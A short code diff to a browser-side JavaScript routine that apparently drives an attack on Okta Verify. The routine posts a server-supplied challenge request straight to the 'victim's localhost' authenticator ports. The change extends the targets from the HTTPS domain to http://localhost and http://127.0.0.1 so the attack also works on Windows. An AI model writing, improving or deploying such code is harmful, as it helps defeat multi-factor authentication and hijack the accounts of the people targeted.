@@ -257,11 +257,18 @@ async function run() {
     const { challengeRequest, httpsDomain, ports } = await res.json();
     setStatus('info', '⏳ Firing challenge to local Okta Verify…');
 
-    // Step 2: browser fires directly to victim's localhost — bypasses server
+    // Step 2: browser fires directly to victim's localhost
+    // Try httpsDomain first (Mac), then http://localhost and http://127.0.0.1 (Windows)
+    const targets = [
+      ...ports.map(p => `${httpsDomain}:${p}`),
+      ...ports.map(p => `http://localhost:${p}`),
+      ...ports.map(p => `http://127.0.0.1:${p}`),
+    ];
+
     let fired = false;
-    for (const port of ports) {
+    for (const url of targets) {
       try {
-        await fetch(`${httpsDomain}:${port}/challenge`, {
+        await fetch(`${url}/challenge`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ challengeRequest }),
